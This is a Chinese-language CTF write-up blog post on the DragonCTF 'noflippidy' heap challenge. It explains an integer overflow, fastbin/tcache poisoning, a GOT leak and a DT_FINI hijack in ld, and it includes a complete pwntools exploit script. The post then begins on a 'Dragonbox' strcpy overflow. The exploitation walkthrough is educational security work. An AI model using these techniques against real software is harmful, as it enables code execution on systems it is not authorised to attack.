<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>DragonCTF-noflippidy-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="昨天的 DragonCTF 中出现了一道改编自 DiceCTF 2021 flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。"><meta property="og:image" content><meta property="og:title" content="DragonCTF-noflippidy-WP"><meta property="og:description" content="昨天的 DragonCTF 中出现了一道改编自 DiceCTF 2021 flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1570.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-11-29T15:49:00+00:00"><meta property="article:modified_time" content="2021-11-29T15:49:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="DragonCTF-noflippidy-WP"><meta name=twitter:description content="昨天的 DragonCTF 中出现了一道改编自 DiceCTF 2021 flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。"><script src=https://chujdk.github.io/js/feather.min.js></script>
<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>DragonCTF-noflippidy-WP</h1><div class=meta>Posted on Nov 29, 2021</div></div><section class=body><p>昨天的 DragonCTF 中出现了一道改编自 <em>DiceCTF 2021</em> flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。很遗憾，比赛的时候草草的看了一眼以为是有什么我不知道的黑魔法可以实现修改 canary 就放弃了，并没有看出漏洞点（说起来这个洞应该挺明显的，没看出来也是挺奇怪的，可能是被概率论期中考弄坏脑子了）。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  max_notes <span style=color:#666>=</span> get_int();
</span></span><span style=display:flex><span>  notebook_ptr <span style=color:#666>=</span> malloc(<span style=color:#40a070>8</span> <span style=color:#666>*</span> max_notes);
</span></span><span style=display:flex><span>  memset(notebook_ptr, <span style=color:#40a070>0</span>, <span style=color:#40a070>8</span> <span style=color:#666>*</span> max_notes);
</span></span></code></pre></div><p>赛后看了 wp 之后，才知道可以通过这里的 8 * max_notes 的整数溢出实现越界写。</p><p>另外，有趣的是，我们可以通过控制 malloc 的大小，使它返回 mmaped 的 chunk，这个 chunk 是可以和 libc 紧邻的（根据大小不同，也可能和 ld 紧邻）。由于没有研究过 mmap 的机制，具体原理我也不太清楚。</p><p>比如这样就可以实现分配一个紧邻 libc 的内存段了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#!/usr/bin/env python
</span></span></span><span style=display:flex><span><span style=color:#007020># coding=utf-8
</span></span></span><span style=display:flex><span><span style=color:#007020></span>from pwn import <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context.log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>context.terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./noflippidy&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./noflippidy&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020>#sh = remote()
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span>def add(index, payload)<span style=color:#666>:</span>
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh.sendlineafter(<span style=color:#4070a0>&#34;Index: &#34;</span>, str(index))
</span></span><span style=display:flex><span>    sh.sendafter(<span style=color:#4070a0>&#34;Content: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(<span style=color:#4070a0>&#34;will be: &#34;</span>, str(<span style=color:#40a070>0x40800000</span>))
</span></span><span style=display:flex><span>base_idx <span style=color:#666>=</span> <span style=color:#40a070>0x4001000</span> <span style=color:#60a0b0;font-style:italic>// 8
</span></span></span></code></pre></div><p>然后就可以越界写 libc 和 ld 中的任意地址了。</p><p>然而到现在能做的还是很少，我们只能分配 0x40 大小的 chunk，并且可以向 libc 和 ld 中写入 heap 地址。那么可以考虑攻击 fastbin 或 tcache。直接写 <code>tcache</code> 变量可以劫持整个 tcache_perthread_struct 到我们可控的地方，然后实现任意地址分配。不过由于我们一次只能申请 0x40 大小的 chunk，伪造起来会比较麻烦。使用 fastbin 也可以实现任意地址分配，这里比较重要的是利用了 2.27 之后 fastbin stash 时，stash 进 tcache 时没有检测目标的 size 字段，这样就使我们绕过 fastbin 对目标 chunk 的 size 字段的检测了，只需要满足目标 chunk 的 fd 为 0 就可以了（不然就会继续 stash，很可能会崩溃）。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>fastbinY_idx <span style=color:#666>=</span> <span style=color:#40a070>0x3EBC50</span> <span style=color:#666>//</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x41</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x404000</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>add(base_idx <span style=color:#666>+</span> fastbinY_idx, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#34;malloc&#34;</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;malloc&#34;</span>]
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span></code></pre></div><p>覆写 fastbinY[2] 为返回给我们的 chunk 的地址之后，第一个 fastbin 就完全由我们伪造了，伪造它的 fd 即可任意地址分配。然后又由于输出 menu 时，使用了一个 char* 数组，我们只要劫持其中的某一个指针指向 got 表即可在 menu 函数执行时直接实现 leak，我这里分配到了 0x404000 处，覆写为 malloc@got 的地址即可。</p><p>最后，由于我们可以向 ld 中写入地址，同时还可以调用 <code>exit(0)</code>，所以可以劫持 <code>l->l_info[DT_FINI]</code> 来实现任意函数调用，这种方法之前没了解过，这里记录一下。具体的，在 _dl_init 函数中，存在这个流程</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (ELF_INITFINI <span style=color:#666>&amp;&amp;</span> l<span style=color:#666>-&gt;</span>l_info[DT_FINI] <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>			DL_CALL_DT_FINI
</span></span><span style=display:flex><span>			  (l, l<span style=color:#666>-&gt;</span>l_addr <span style=color:#666>+</span> l<span style=color:#666>-&gt;</span>l_info[DT_FINI]<span style=color:#666>-&gt;</span>d_un.d_ptr);
</span></span></code></pre></div><p><code>DL_CALL_DT_FINI</code> 的定义为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020># define DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()
</span></span></span></code></pre></div><p>可见这个劫持了 <code>d_un.d_ptr</code> 后这个原语就可以实现任意函数调用了。</p><p><code>l->l_info[DT_FINI]</code> 的偏移是怎么算的我也没搞清楚，我是通过动调得出的。不过我懒得手动编译一个源码调了，就 ida 反汇编了一下勉强看着才找到的，对照源码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>		      <span style=color:#60a0b0;font-style:italic>/* First see whether an array is given.  */</span>
</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (l<span style=color:#666>-&gt;</span>l_info[DT_FINI_ARRAY] <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>			{
</span></span><span style=display:flex><span>			  ElfW(Addr) <span style=color:#666>*</span>array <span style=color:#666>=</span>
</span></span><span style=display:flex><span>			    (ElfW(Addr) <span style=color:#666>*</span>) (l<span style=color:#666>-&gt;</span>l_addr
</span></span><span style=display:flex><span>					    <span style=color:#666>+</span> l<span style=color:#666>-&gt;</span>l_info[DT_FINI_ARRAY]<span style=color:#666>-&gt;</span>d_un.d_ptr);
</span></span><span style=display:flex><span>			  <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> i <span style=color:#666>=</span> (l<span style=color:#666>-&gt;</span>l_info[DT_FINI_ARRAYSZ]<span style=color:#666>-&gt;</span>d_un.d_val
</span></span><span style=display:flex><span>					    <span style=color:#666>/</span> <span style=color:#007020;font-weight:700>sizeof</span> (ElfW(Addr)));
</span></span><span style=display:flex><span>			  <span style=color:#007020;font-weight:700>while</span> (i<span style=color:#666>--</span> <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>			    ((fini_t) array[i]) ();
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		      <span style=color:#60a0b0;font-style:italic>/* Next try the old-style destructor.  */</span>
</span></span><span style=display:flex><span>		      <span style=color:#007020;font-weight:700>if</span> (ELF_INITFINI <span style=color:#666>&amp;&amp;</span> l<span style=color:#666>-&gt;</span>l_info[DT_FINI] <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>			DL_CALL_DT_FINI
</span></span><span style=display:flex><span>			  (l, l<span style=color:#666>-&gt;</span>l_addr <span style=color:#666>+</span> l<span style=color:#666>-&gt;</span>l_info[DT_FINI]<span style=color:#666>-&gt;</span>d_un.d_ptr);
</span></span><span style=display:flex><span>		    }
</span></span></code></pre></div><p>可以知道在反编译的伪代码中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>              <span style=color:#007020;font-weight:700>do</span>
</span></span><span style=display:flex><span>                (<span style=color:#666>*</span>v16<span style=color:#666>--</span>)(<span style=color:#666>&amp;</span>unk_22A968);
</span></span><span style=display:flex><span>              <span style=color:#007020;font-weight:700>while</span> ( v16 <span style=color:#666>!=</span> v22 );
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            v17 <span style=color:#666>=</span> v12[<span style=color:#40a070>21</span>];
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> ( v17 )
</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>LABEL_26</span>:
</span></span><span style=display:flex><span>              ((<span style=color:#902000>void</span> (<span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#666>*</span>)(<span style=color:#902000>void</span> <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#007020;font-weight:700>__int64</span>, <span style=color:#007020;font-weight:700>__int64</span>))(<span style=color:#666>*</span>v12 <span style=color:#666>+</span> <span style=color:#666>*</span>(_QWORD <span style=color:#666>*</span>)(v17 <span style=color:#666>+</span> <span style=color:#40a070>8</span>)))(
</span></span><span style=display:flex><span>                <span style=color:#666>&amp;</span>unk_22A968,
</span></span><span style=display:flex><span>                v9,
</span></span><span style=display:flex><span>                v10,
</span></span><span style=display:flex><span>                v11);
</span></span></code></pre></div><p>v17 就是 <code>l->l_info[DT_FINI]</code> 了，所以</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>.text:0000000000010D1D <span style=color:#40a070>058</span> <span style=color:#40a070>49</span> 8B <span style=color:#40a070>85</span> A8 <span style=color:#40a070>00</span> <span style=color:#40a070>00</span> <span style=color:#40a070>00</span>                    mov     rax, <span style=color:#666>[</span>r13+0A8h<span style=color:#666>]</span>
</span></span></code></pre></div><p><code>r13 + 0xA8</code> 就是目标了。</p><p>完整的 exp：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#34;debug&#34;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./noflippidy&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./noflippidy&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = remote()</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add</span>(index, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;Index: &#34;</span>, <span style=color:#007020>str</span>(index))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Content: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;will be: &#34;</span>, <span style=color:#007020>str</span>(<span style=color:#40a070>0x40800000</span>))
</span></span><span style=display:flex><span>base_idx <span style=color:#666>=</span> <span style=color:#40a070>0x4001000</span> <span style=color:#666>//</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fastbinY_idx <span style=color:#666>=</span> <span style=color:#40a070>0x3EBC50</span> <span style=color:#666>//</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x41</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x404000</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>add(base_idx <span style=color:#666>+</span> fastbinY_idx, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>add(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x10</span> <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#34;malloc&#34;</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n\n</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;malloc&#34;</span>]
</span></span><span style=display:flex><span>one_gadget <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x4f432</span>
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(one_gadget) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>add(<span style=color:#40a070>0x461D218</span> <span style=color:#666>//</span> <span style=color:#40a070>8</span> <span style=color:#666>-</span> <span style=color:#40a070>2</span>, payload)
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;: &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>这应该算是原题的一个非预期解，出成了题目还是很有意思的。ld 相关的利用我接触的也不是很多，不太熟，这里也算是学到了劫持 <code>l->l_info[DT_FINI]</code> 的这种利用方法了。</p><h3 id=dragonbox>Dragonbox</h3><p>顺带提一下这题，比赛时我甚至没打开附件看一下，赛后看了一下 wp，发现这个题还是能给我们一点反思的。漏洞点比较明显</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span> <span style=color:#06287e>set_user</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span><span style=color:#666>*</span> username, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span><span style=color:#666>*</span> password) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>password) {
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* Disallow empty pass for security reasons */</span>
</span></span><span style=display:flex><span>        password <span style=color:#666>=</span> <span style=color:#4070a0>&#34;default&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    strcpy(g_username, username);
</span></span><span style=display:flex><span>    strcpy(g_password, password);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>bool</span> <span style=color:#06287e>get_user</span>(<span style=color:#902000>int</span> fd) {
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> buf[<span style=color:#007020;font-weight:700>sizeof</span>(g_username) <span style=color:#666>+</span> <span style=color:#40a070>1</span><span style=color:#60a0b0;font-style:italic>/*&#39;:&#39;*/</span> <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(g_password)] <span style=color:#666>=</span> { <span style=color:#40a070>0</span> };
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>        ssize_t x <span style=color:#666>=</span> read(fd, buf, <span style=color:#007020;font-weight:700>sizeof</span>(buf) <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (x <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>if</span> (errno <span style=color:#666>==</span> EINTR <span style=color:#666>||</span> errno <span style=color:#666>==</span> EAGAIN) {
</span></span><span style=display:flex><span>                sched_yield();
</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>false</span>;
</span></span><span style=display:flex><span>        } <span style=color:#007020;font-weight:700>else</span> <span style=color:#007020;font-weight:700>if</span> (x <span style=color:#666>==</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>false</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (buf[x <span style=color:#666>-</span> <span style=color:#40a070>1</span>] <span style=color:#666>==</span> <span style=color:#4070a0>&#39;\n&#39;</span>) {
</span></span><span style=display:flex><span>            buf[x <span style=color:#666>-</span> <span style=color:#40a070>1</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> username <span style=color:#666>=</span> buf;
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> password <span style=color:#666>=</span> strchr(buf, <span style=color:#4070a0>&#39;:&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (password) {
</span></span><span style=display:flex><span>        <span style=color:#666>*</span>password<span style=color:#666>++</span> <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    set_user(username, password);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>true</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>就是在 set_user 时，可以通过 password 向后溢出，不过溢出只能做到修改 <code>g_flags</code> 这个变量</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000051</span><span style=color:#40a070>80</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??+</span>    g_password      db <span style=color:#40a070>100</span>h dup(<span style=color:#666>?</span>)          ; DATA <span style=color:#002070;font-weight:700>XREF</span>: set_user<span style=color:#666>+</span><span style=color:#40a070>40</span><span>↑</span>o
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000051</span><span style=color:#40a070>80</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??+</span>                                            ; handle_connection<span style=color:#666>+</span>F4<span>↑</span>o
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000052</span><span style=color:#40a070>80</span>                             ; <span style=color:#902000>int</span> g_flags
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000052</span><span style=color:#40a070>80</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span>                 g_flags         dd <span style=color:#666>?</span>                    ; DATA <span style=color:#002070;font-weight:700>XREF</span>: spawn_daemon<span style=color:#666>+</span>C<span>↑</span>r
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000052</span><span style=color:#40a070>80</span>                                                                     ; main<span style=color:#666>+</span><span style=color:#40a070>58</span><span>↑</span>r ...
</span></span><span style=display:flex><span>.<span style=color:#002070;font-weight:700>bss</span>:<span style=color:#40a070>00000000000052</span><span style=color:#40a070>84</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span> <span style=color:#666>??</span>                                 align <span style=color:#40a070>8</span>
</span></span></code></pre></div><p>此变量只在和用户建立连接和 <code>spawn_daemon</code> 中被用到</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>    <span style=color:#902000>int</span> x <span style=color:#666>=</span> socketpair(AF_UNIX, SOCK_STREAM <span style=color:#666>|</span> g_flags, <span style=color:#40a070>0</span>, g_daemon_fds);
</span></span></code></pre></div><p>这里与“验证服务器”建立了连接，检测用户有没有权利读取 <code>flag</code>。对于 <code>socketpair</code>，man 中说到</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>RETURN VALUE
</span></span><span style=display:flex><span>       On success, zero is returned.  On error, <span style=color:#666>-</span><span style=color:#40a070>1</span> is returned, errno is set appropriately, and sv is left unchanged
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       On  Linux  (and other systems), socketpair() does not modify sv on failure.  A requirement standardizing <span style=color:#007020;font-weight:700>this</span> behavior
</span></span><span style=display:flex><span>       was added in POSIX<span style=color:#40a070>.1</span><span style=color:#666>-</span><span style=color:#40a070>2016.</span>
